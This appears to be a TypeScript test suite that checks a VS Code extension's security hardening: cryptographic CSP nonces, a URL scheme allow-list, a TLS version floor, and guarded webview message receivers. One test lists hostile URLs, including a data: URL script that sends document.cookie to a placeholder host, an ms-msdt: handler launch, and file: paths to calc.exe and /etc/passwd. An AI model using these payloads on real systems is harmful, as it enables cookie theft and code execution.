// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 MessageFoundry Organization and contributors
import * as assert from "assert";
import * as fs from "fs";
import type * as httpsTypes from "node:https";
import * as path from "path";

import { nonce } from "../../cspNonce";
import { assertBrowsableUrl, assertTargetAllowed } from "../../engineTarget";
import { getJson, postJson } from "../../engineClient";
import { WEBVIEW_GUARD_NOTE } from "../../webviewMessaging";

// Four hardening properties of the extension, asserted against the SOURCE as well as against
// behaviour. Reading the source matters here for a measured reason: the extension has already shipped
// a broken artifact because nothing read the file it lived in, and every one of these defects is the
// kind that reappears in the NEXT panel someone adds rather than in the ones fixed today. A test that
// only exercises the code paths that exist now would pass while the same defect walked back in.
//
// Every scan below prints what it scanned and carries a vacuity guard, because a source scan that
// silently matches nothing is indistinguishable from a clean repo.

const IDE_ROOT = path.join(__dirname, "..", "..", "..");
const SRC = path.join(IDE_ROOT, "src");

/** Every production .ts under src/, i.e. excluding the test tree itself. */
function productionSources(): { file: string; rel: string; text: string }[] {
  const out: { file: string; rel: string; text: string }[] = [];
  const walk = (dir: string): void => {
    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
      const full = path.join(dir, entry.name);
      if (entry.isDirectory()) {
        if (entry.name !== "test") {
          walk(full);
        }
      } else if (entry.name.endsWith(".ts")) {
        out.push({ file: full, rel: path.relative(SRC, full), text: fs.readFileSync(full, "utf8") });
      }
    }
  };
  walk(SRC);
  return out;
}

/**
 * The webview scripts shipped as static assets rather than as HTML-string literals in a .ts.
 *
 * They are the same kind of code as the receivers and nonces scanned below — `media/stepsWebview.js`
 * is loaded into a real webview via `localResourceRoots` — so a scan restricted to `src/**` has a
 * blind spot exactly where the next occurrence could land. Measured at the time of writing: zero
 * `Math.random` call sites and zero message receivers there, so widening the corpus changes no count
 * today; it is what makes tomorrow's addition visible.
 */
function webviewAssetSources(): { file: string; rel: string; text: string }[] {
  const root = path.join(IDE_ROOT, "media");
  if (!fs.existsSync(root)) {
    return [];
  }
  // RECURSIVE, and .mjs as well as .js. The non-recursive .js-only read this replaces was narrower
  // than the guarantee the scans below state: a receiver added under media/walkthrough/, or spelled
  // .mjs, never reached the regexes at all, so "no offending line found" was answering a smaller
  // question than the one asked. Nothing moves today (the count is unchanged); tomorrow's does.
  const out: { file: string; rel: string; text: string }[] = [];
  const walk = (dir: string): void => {
    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
      const full = path.join(dir, entry.name);
      if (entry.isDirectory()) {
        walk(full);
      } else if (entry.name.endsWith(".js") || entry.name.endsWith(".mjs")) {
        out.push({
          file: full,
          rel: `media/${path.relative(root, full).split(path.sep).join("/")}`,
          text: fs.readFileSync(full, "utf8"),
        });
      }
    }
  };
  walk(root);
  return out;
}

/** Every file that can carry a CSP nonce or a webview message receiver. */
function webviewCodeSources(): { file: string; rel: string; text: string }[] {
  return [...productionSources(), ...webviewAssetSources()];
}

suite("extension hardening — the source corpus is actually being read", () => {
  test("the scan sees a real, non-trivial set of production sources", () => {
    // POSITIVE CONTROL for every scan in this file. If productionSources() ever returns nothing (a
    // moved directory, a changed extension, a broken join), every "no offending line found" assertion
    // below would pass vacuously and report a clean repo. Anchor it on a count and on a known file.
    const sources = productionSources();
    assert.ok(
      sources.length > 40,
      `expected the extension's production sources; scanned ${sources.length} files under ${SRC}`,
    );
    assert.ok(
      sources.some((s) => s.rel === "engineClient.ts"),
      `the scan did not find engineClient.ts; it scanned ${sources.map((s) => s.rel).join(", ")}`,
    );
  });

  test("the scan also reaches the webview scripts shipped as static assets", () => {
    // SECOND POSITIVE CONTROL, for the half of the corpus that does not live under src/. Without it
    // the nonce and receiver scans below would report a clean media/ directory whether or not they
    // ever opened one.
    const assets = webviewAssetSources();
    assert.ok(
      assets.some((a) => a.rel === "media/stepsWebview.js"),
      `the scan did not reach media/; it found ${assets.map((a) => a.rel).join(", ") || "nothing"}`,
    );
  });
});

suite("CSP nonces come from a cryptographic source", () => {
  test("no production source generates a nonce from Math.random", () => {
    // The security property is the ENTROPY SOURCE, not the length. A CSP nonce is a capability —
    // script-src 'nonce-X' executes any script presenting X — so a predictable X converts markup
    // injection into script execution. Math.random is a non-cryptographic PRNG whose state is
    // recoverable from its output, and twelve hand-copied generators used it.
    const sources = webviewCodeSources();
    const offenders = sources.flatMap(({ rel, text }) =>
      text
        .split(/\r?\n/)
        .map((line, i) => ({ rel, line: line.trim(), n: i + 1 }))
        // The rationale in cspNonce.ts NAMES Math.random to explain why it is unusable, so match
        // calls only and not prose. A bare mention in a comment is not a use.
        .filter(({ line }) => /Math\s*\.\s*random\s*\(/.test(line) && !line.startsWith("//")),
    );
    assert.deepStrictEqual(
      offenders.map((o) => `${o.rel}:${o.n} ${o.line}`),
      [],
      `scanned ${sources.length} files under ${SRC} and the media/ webview assets`,
    );
  });

  test("the nonce generator draws from node:crypto, which is the extension-host API", () => {
    // The correctness trap: the extension host (Node) and a webview (browser) have DIFFERENT crypto
    // APIs. Every nonce here is built host-side while composing the HTML, before the webview exists,
    // so node:crypto is the right one and crypto.getRandomValues is not even in scope. Asserted on
    // the source because the alternative — inferring the entropy source from output — cannot
    // distinguish a good generator from a lucky one.
    const text = fs.readFileSync(path.join(SRC, "cspNonce.ts"), "utf8");
    assert.ok(/from "node:crypto"/.test(text), "cspNonce.ts must import node:crypto");
    assert.ok(/randomBytes\s*\(/.test(text), "cspNonce.ts must call randomBytes");
  });

  test("nonces are unguessable in shape: full length, CSP-safe alphabet, never repeated", () => {
    const values = Array.from({ length: 500 }, () => nonce());
    for (const v of values) {
      assert.strictEqual(v.length, 24, `unexpected nonce length: ${v}`);
      // base64url only, so the value is safe verbatim in both the nonce="" attribute and the
      // 'nonce-...' CSP directive with nothing to escape.
      assert.ok(/^[A-Za-z0-9_-]{24}$/.test(v), `nonce outside the base64url alphabet: ${v}`);
    }
    assert.strictEqual(new Set(values).size, values.length, "a nonce repeated within 500 draws");
  });
});

suite("every external URL open passes a positive scheme allow-list", () => {
  test("hostile schemes are refused by both gates", () => {
    // These are the exact values that passed the pre-change deny-list gate. openExternal routes to
    // the OS handler, so a recognised scheme LAUNCHES AN APPLICATION rather than opening a page —
    // ms-msdt: being the well-known example. A deny-list cannot cover this: the handler registry is
    // open-ended, so the set to refuse is unbounded.
    const hostile = [
      "javascript:alert(1)",
      "file:///C:/Windows/System32/calc.exe",
      "data:text/html,<script>fetch('http://x/'+document.cookie)</script>",
      "vscode://ms-vscode.node-debug/launch",
      "ms-msdt:/id PCWDiagnostic",
      "ftp://example.com/x",
    ];
    for (const url of hostile) {
      assert.strictEqual(assertBrowsableUrl(url).ok, false, `assertBrowsableUrl admitted ${url}`);
      assert.strictEqual(assertTargetAllowed(url).ok, false, `assertTargetAllowed admitted ${url}`);
    }
  });

  test("the legitimate schemes still pass, so the allow-list is not merely refusing everything", () => {
    // NEGATIVE CONTROL for the test above: a gate that returned ok:false unconditionally would pass
    // it while breaking the extension outright.
    assert.strictEqual(assertBrowsableUrl("http://127.0.0.1:8765/ui").ok, true);
    assert.strictEqual(assertBrowsableUrl("https://engine.example.com/ui").ok, true);
    assert.strictEqual(assertBrowsableUrl("http://engine.example.com/ui").ok, true);
    assert.strictEqual(assertTargetAllowed("http://127.0.0.1:8765").ok, true);
    assert.strictEqual(assertTargetAllowed("https://engine.example.com").ok, true);
  });

  test("a refusal names the scheme it rejected, so the failure is diagnosable", () => {
    const r = assertBrowsableUrl("file:///etc/passwd");
    assert.ok(!r.ok && /file:/.test(r.reason), `unhelpful refusal: ${JSON.stringify(r)}`);
  });

  // WHAT THIS PAIR OF TESTS CAN AND CANNOT PROVE, stated plainly so nobody reads them as stronger
  // than they are. A source scan cannot do data-flow, so it cannot prove that the guard above a call
  // is the guard FOR that call. What it can do is refuse to let a call site appear without review:
  // the census below is pinned by module and by argument expression, so a second openExternal — even
  // one added inside a function that already guards a different value — fails until someone puts it
  // in the list. That is the property that actually survives a new panel being added. An earlier
  // version of this test asked only whether the MODULE mentioned the guard anywhere, which every
  // module containing one call already satisfies; it therefore could not fail for a per-site defect.

  /** Every openExternal call site: the module, and the expression handed to Uri.parse. */
  function openExternalSites(): { rel: string; n: number; arg: string; line: string }[] {
    const out: { rel: string; n: number; arg: string; line: string }[] = [];
    for (const { rel, text } of productionSources()) {
      text.split(/\r?\n/).forEach((raw, i) => {
        const line = raw.trim();
        if (line.startsWith("//") || line.startsWith("*")) {
          return; // prose naming the API is not a call site
        }
        if (!/openExternal\s*\(/.test(line)) {
          return;
        }
        const m = /openExternal\(\s*vscode\.Uri\.parse\(\s*(.+?)\s*\)\s*\)/.exec(line);
        assert.ok(
          m,
          `openExternal call at ${rel}:${i + 1} is not in the single-line vscode.Uri.parse shape this ` +
            `scan can read, so it would be classified silently. Rewrite it or teach the scan: ${line}`,
        );
        out.push({ rel, n: i + 1, arg: m[1], line });
      });
    }
    return out;
  }

  test("the set of openExternal call sites is exactly the reviewed set", () => {
    // TRIPWIRE, same design as the webview receiver count. Deliberately pinned on module + argument
    // rather than on line numbers, so ordinary edits above a call do not churn it but a NEW call
    // does. If this fails because you added a legitimate one: screen it with assertBrowsableUrl,
    // then add it here.
    const sites = openExternalSites();
    assert.deepStrictEqual(
      sites.map((s) => `${s.rel} :: ${s.arg}`).sort(),
      [
        'sourceControl.ts :: "https://git-scm.com/downloads"',
        "auth.ts :: target",
        "statusBar.ts :: url",
      ].sort(),
      "a new openExternal call site appeared; screen its scheme and add it to this list",
    );
  });

  test("every dynamic openExternal call site screens its own argument first", () => {
    const sources = productionSources();
    const sites = openExternalSites();
    assert.ok(
      sites.length >= 3,
      `VACUITY GUARD: expected the known openExternal call sites, found ${sites.length}`,
    );
    const dynamic = sites.filter((s) => !/^"https?:\/\//.test(s.arg));
    assert.ok(
      dynamic.length >= 2,
      `VACUITY GUARD: the literal exemption swallowed the whole census (${sites.length} sites, ${dynamic.length} dynamic)`,
    );
    const unguarded = dynamic.filter(({ rel, n, arg }) => {
      const lines = sources.find((s) => s.rel === rel)!.text.split(/\r?\n/);
      // The guard must screen THIS call's exact argument, and its refusal branch must return before
      // reaching the call -- a guard whose result is discarded is decoration.
      const before = lines.slice(Math.max(0, n - 25), n - 1).join("\n");
      const escaped = arg.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
      const guard = new RegExp(
        `const\\s+(\\w+)\\s*=\\s*assertBrowsableUrl\\(\\s*${escaped}\\s*\\)[\\s\\S]*?` +
          `if\\s*\\(\\s*!\\s*\\1\\.ok\\s*\\)[\\s\\S]*?return\\s*;`,
      );
      return !guard.test(before);
    });
    assert.deepStrictEqual(
      unguarded.map((u) => `${u.rel}:${u.n} ${u.line}`),
      [],
      "every dynamic openExternal must screen its own argument with assertBrowsableUrl and return on refusal",
    );
  });
});

suite("https requests carry a pinned TLS floor", () => {
  // Asserted BEHAVIOURALLY — on the options object the client actually hands the TLS layer — rather
  // than by grepping for the string. The defect was an inherited process-wide default
  // (NODE_OPTIONS=--tls-min-v1.0 lowers tls.DEFAULT_MIN_VERSION for the whole process and every
  // request silently followed it down), and only the value reaching `request` answers that.
  // Patch the MODULE object, not a namespace import. TypeScript's `import * as https` compiles to an
  // __importStar copy whose properties are getters onto the real module, so assigning to the copy
  // fails and assigning to the module is what both this file and engineClient.ts observe.
  const httpsModule = require("node:https") as { request: typeof httpsTypes.request };
  let captured: httpsTypes.RequestOptions | undefined;
  let realRequest: typeof httpsTypes.request;

  setup(() => {
    captured = undefined;
    realRequest = httpsModule.request;
    httpsModule.request = ((_url: unknown, options: httpsTypes.RequestOptions): unknown => {
      captured = options;
      throw new Error("intercepted before the socket");
    }) as unknown as typeof httpsTypes.request;
  });

  teardown(() => {
    httpsModule.request = realRequest;
  });

  test("getJson over https pins minVersion to TLSv1.2", async () => {
    await assert.rejects(getJson("https://engine.example.com", "/health"));
    assert.ok(captured, "the interceptor never ran — the test proves nothing");
    assert.strictEqual(captured!.minVersion, "TLSv1.2");
  });

  test("postJson over https pins minVersion to TLSv1.2", async () => {
    await assert.rejects(postJson("https://engine.example.com", "/promote", { a: 1 }));
    assert.ok(captured, "the interceptor never ran — the test proves nothing");
    assert.strictEqual(captured!.minVersion, "TLSv1.2");
  });

  test("a plain-http request does not go through the https transport at all", async () => {
    // NEGATIVE CONTROL. If the interceptor fired here, the previous two assertions would not be
    // telling us anything about scheme-conditional behaviour.
    await assert.rejects(getJson("http://127.0.0.1:1/health", "/health", undefined, 50));
    assert.strictEqual(captured, undefined, "an http:// URL must not reach https.request");
  });
});

/**
 * How a webview `message` receiver can be spelled, deliberately wider than the code uses.
 *
 * The count and the marker guarantee below are stated over "every receiver", so the instrument has
 * to be able to FIND every receiver. `window.addEventListener('message'` was the only spelling the
 * regex admitted; `globalThis.`, `self.` and a bare `addEventListener('message'` all evaded it, and a
 * completeness claim resting on that instrument was answering a narrower question than it stated.
 * Measured: widening changes no count today.
 */
const RECEIVER_RE = /(?:^|[^.\w$])(?:window|globalThis|self|top|parent)?\.?addEventListener\(\s*['"`]message['"`]/;

/** The source text a `.ts` panel writes to emit the marker; `media/*.js` would carry the literal. */
const MARKER_INTERPOLATION = "${WEBVIEW_GUARD_NOTE}";

/** Every webview `message` receiver in the shipped corpus, with the line above it and its body. */
function receivers(): { rel: string; n: number; prev: string; body: string }[] {
  return webviewCodeSources().flatMap(({ rel, text }) => {
    const lines = text.split(/\r?\n/);
    return lines
      .map((line, i) => ({
        rel,
        line: line.trim(),
        n: i + 1,
        prev: (lines[i - 1] ?? "").trim(),
        body: lines.slice(i, i + 12).join("\n"),
      }))
      .filter(({ line }) => RECEIVER_RE.test(line));
  });
}

suite("webview message receivers check origin, source and the channel token", () => {
  test("every window message listener carries the guard marker", () => {
    // Shape validation is not origin validation, and the two get conflated. Each receiver now runs
    // its event through mfTrusted() first, and says so on the line above. This test is what makes a
    // NEW receiver answer the question instead of inheriting silence.
    const found = receivers();
    const scanned = webviewCodeSources().length;
    assert.strictEqual(
      found.length,
      8,
      `expected the 8 known webview message receivers; found ${found.length} across ${scanned} files — ` +
        "a new one must be reviewed and this count updated deliberately",
    );
    const silent = found.filter(
      ({ prev }) => prev !== MARKER_INTERPOLATION && prev !== WEBVIEW_GUARD_NOTE,
    );
    assert.deepStrictEqual(
      silent.map((s) => `${s.rel}:${s.n}`),
      [],
      `each receiver must be preceded by ${MARKER_INTERPOLATION} (or, outside a .ts template, its literal text)`,
    );
  });

  test("the widened receiver regex still finds what the narrow one found", () => {
    // POSITIVE CONTROL for the widening, and a falsification of it: the spellings that used to evade
    // must now match, and a non-message listener must still not.
    const spellings = [
      "window.addEventListener('message', (e) => {",
      "globalThis.addEventListener('message', (e) => {",
      'self.addEventListener("message", (e) => {',
      "addEventListener('message', (e) => {",
    ];
    for (const spelling of spellings) {
      assert.ok(RECEIVER_RE.test(spelling), `the receiver regex missed: ${spelling}`);
    }
    const decoys = [
      "el.addEventListener('click', () => {})",
      "port.addEventListener('messageerror', () => {})",
      "socket.onmessage = () => {}",
    ];
    for (const decoy of decoys) {
      assert.ok(!RECEIVER_RE.test(decoy), `the receiver regex over-matched: ${decoy}`);
    }
  });

  test("every webview message receiver routes its event through the guard", () => {
    // The discard itself, which is the half a documented rationale could never supply. A receiver
    // that read `e.data` directly would be back where this started.
    const offenders = receivers()
      .filter(({ body }) => !/mfTrusted\(/.test(body))
      .map(({ rel, n }) => `${rel}:${n}`);
    assert.deepStrictEqual(offenders, [], "a receiver read its event without the mfTrusted() guard");
  });

  test("no host-to-webview send bypasses the token stamp", () => {
    // The other end of the same channel. An unstamped send is discarded by the receiver, so a bypass
    // is a silently dead feature rather than a visible error — which is exactly why it is pinned.
    const offenders: string[] = [];
    for (const { rel, text } of productionSources()) {
      if (rel === "webviewMessaging.ts") {
        continue; // the one legitimate raw send: the stamping call itself
      }
      text.split(/\r?\n/).forEach((line, i) => {
        if (/webview\s*\.\s*postMessage\(/.test(line)) {
          offenders.push(`${rel}:${i + 1}`);
        }
      });
    }
    assert.deepStrictEqual(
      offenders,
      [],
      "post through postToWebview() so the send carries this render's channel token",
    );
  });

  test("every panel that embeds a receiver also opens a channel and embeds the guard", () => {
    // Counts rather than a per-file map, so the pin does not need editing when a panel moves.
    const sources = productionSources().filter((s) => s.rel !== "webviewMessaging.ts");
    const count = (needle: RegExp): number =>
      sources.reduce((acc, s) => acc + (s.text.match(needle)?.length ?? 0), 0);
    assert.strictEqual(count(/guardScript\(token\)/g), 8, "one embedded guard per receiver");
    assert.strictEqual(count(/openChannel\(/g), 8, "one channel opened per receiver-bearing render");
  });

  test("every webview message receiver still discriminates on a message shape", () => {
    // The other half, and the one that bounds what a message can ASK FOR rather than who sent it.
    // The token guard does not retire it: a host-side bug posts a validly stamped wrong payload.
    const offenders = receivers()
      .filter(({ body }) => !/\.(command|type)\s*===|\b(command|type)\s*===/.test(body))
      .map(({ rel, n }) => `${rel}:${n}`);
    assert.deepStrictEqual(offenders, [], "a receiver dispatched without a shape discriminator");
  });

  test("the shared rationale says what the checks are and what they rest on", () => {
    // Guards against the note decaying back into a bare marker. It must keep naming the delivery
    // measurement the checks are derived from — an opaque origin would make the origin arm vacuous,
    // and `window.parent` is shadowed by the bridge, which is why the source arm is written against
    // `window` — and it must keep saying the nonce CSP is the enforcement property, which is why the
    // nonce being cryptographically random (the suite above) is load-bearing and not cosmetic.
    const text = fs.readFileSync(path.join(SRC, "webviewMessaging.ts"), "utf8");
    const claims = [
      "vscode-webview://",
      "nonce",
      "cspNonce.ts",
      "window.parent = window",
      "ev.origin === window.origin",
      "opaque",
    ];
    for (const claim of claims) {
      assert.ok(text.includes(claim), `the rationale no longer mentions ${claim}`);
    }
  });
});
